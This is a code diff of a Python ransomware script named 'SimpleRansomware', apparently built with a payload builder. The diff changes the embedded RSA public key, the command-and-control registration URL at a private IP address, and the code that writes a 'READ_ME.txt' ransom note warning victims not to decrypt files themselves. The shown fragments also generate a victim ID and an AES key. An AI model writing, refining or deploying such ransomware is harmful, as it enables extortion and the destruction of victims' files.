@@ -12,18 +12,18 @@ import uuid
 
 # Public key will be inserted by payload_builder
 PUBLIC_KEY = '''-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAldf/W7Y/3x5Cgx6sKcAN
-2DSyApCAwZrv4fexiZjmZ9/sEaNcoRZoivMMvRx2MvFxCkeztIp9L6lUu4hU5s96
-gNBJKOzmHm6FCcmYYlvVqW0ZNrfGOW2inKFOaqQQtQTPr6IsNfVGIzjNDZcHWteX
-JUQ8imVvSxXFNA91gnzp6w+yQTLmUPVWQuTZwP7k+BwTGH31QOZUmuJe41VCQ+rO
-mtcQhG2rlbIxMcI1Q3BbXX+LfY64toDJC+6CTrfSc4KBIHnX4CoU5YTBXL1y2BPV
-eZpjzpkEagjW2T/YcctFxHNsh1H0DlSR1KH+EWDSX7Q76mundfzBcAgdFncV170b
-WwIDAQAB
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArUwpk173eSKNhvgH6qeB
+A+yz96tOyUY5+m3Y354Mr6olQkF9ftMCVoqr8anrlUaSrT6E9a6gDfYLEQ4yo2us
+385UBkizzbK0VXIfwV1eZa1HPUGtolZmfP2Do3oidSYy2Pg2BaqxXxgEfP0CDeAS
+bKGLzxVYGJcihWVnvJ/SH5DWF77oWchKWMvZScgVCriggqVvZqeGuZPMrGq3ipAD
+/Ntk0jEh/iP4hkx2ClX6DWQp8ZgBaPIK1FgBccTsZT8uaLXcgzQNvDkE5GqVVgjL
+fcSJNJxIYp9+KFAruec9qSPCKD4RYgOoZvF5BKbFQP7D2TdyJWstxdW1IeTpB/z5
+SQIDAQAB
 -----END PUBLIC KEY-----'''
 
 class SimpleRansomware:
     def __init__(self):
-        self.c2_url = f"http://192.168.0.112:5000/register"
+        self.c2_url = f"http://192.168.1.13:5000/register"
         self.victim_id = str(uuid.uuid4())[:8]
         self.aes_key = os.urandom(32)
         self.public_key = self.load_key()
@@ -108,9 +108,8 @@ class SimpleRansomware:
         Don't try to decrypt files yourself!
         """
         
-        with open("READ_ME.txt", "w", encoding="utf-8", errors="ignore") as f:
+        with open("READ_ME.txt", "w", encoding='utf-8') as f:
             f.write(note)
-
         
         print("[+] Ransom note created: READ_ME.txt")
     
